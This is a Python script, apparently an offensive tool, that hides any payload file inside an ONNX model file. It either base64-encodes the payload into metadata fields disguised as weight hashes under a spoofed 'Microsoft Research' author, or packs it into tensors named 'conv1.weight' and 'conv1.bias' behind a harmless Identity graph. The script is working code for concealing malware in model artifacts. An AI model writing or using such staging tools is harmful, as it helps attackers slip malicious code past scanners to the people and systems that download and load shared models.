import base64
import sys

import numpy as np
import onnx
from onnx import helper, TensorProto, numpy_helper, StringStringEntryProto


def create_staged_model(payload_path: str, output_path: str, method: str = "weights"):
    with open(payload_path, "rb") as f:
        payload = f.read()

    X = helper.make_tensor_value_info("input", TensorProto.FLOAT, [1, 3, 224, 224])
    Y = helper.make_tensor_value_info("output", TensorProto.FLOAT, [1, 3, 224, 224])
    node = helper.make_node("Identity", inputs=["input"], outputs=["output"])

    if method == "metadata":
        chunks = [
            base64.b64encode(payload[i:i + 65536]).decode()
            for i in range(0, len(payload), 65536)
        ]
        metadata = {
            "model_author": "Microsoft Research",
            "model_version": "2.1.0",
            "model_description": "Image classification model for edge inference",
            "payload_chunks": str(len(chunks)),
        }
        for i, chunk in enumerate(chunks):
            metadata[f"weight_hash_{i}"] = chunk

        props = [StringStringEntryProto(key=k, value=v) for k, v in metadata.items()]
        graph = helper.make_graph([node], "inference_graph", [X], [Y])
        model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 13)])
        model.metadata_props.extend(props)

    elif method == "weights":
        padded = payload + b"\x00" * ((4 - len(payload) % 4) % 4)
        weight = np.frombuffer(padded, dtype=np.float32)
        weight_tensor = numpy_helper.from_array(
            weight.reshape(1, 1, 1, weight.size), name="conv1.weight"
        )
        size_tensor = numpy_helper.from_array(
            np.array([len(payload)], dtype=np.int64), name="conv1.bias"
        )
        graph = helper.make_graph(
            [node], "inference_graph", [X], [Y], initializer=[weight_tensor, size_tensor]
        )
        model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 13)])
    else:
        raise ValueError(f"Unknown method: {method}")

    onnx.checker.check_model(model)
    onnx.save(model, output_path)
    print(f"[+] Model created successfully at {output_path}")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <payload_file> <output.onnx> [metadata|weights]")
        sys.exit(1)
    create_staged_model(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "weights")
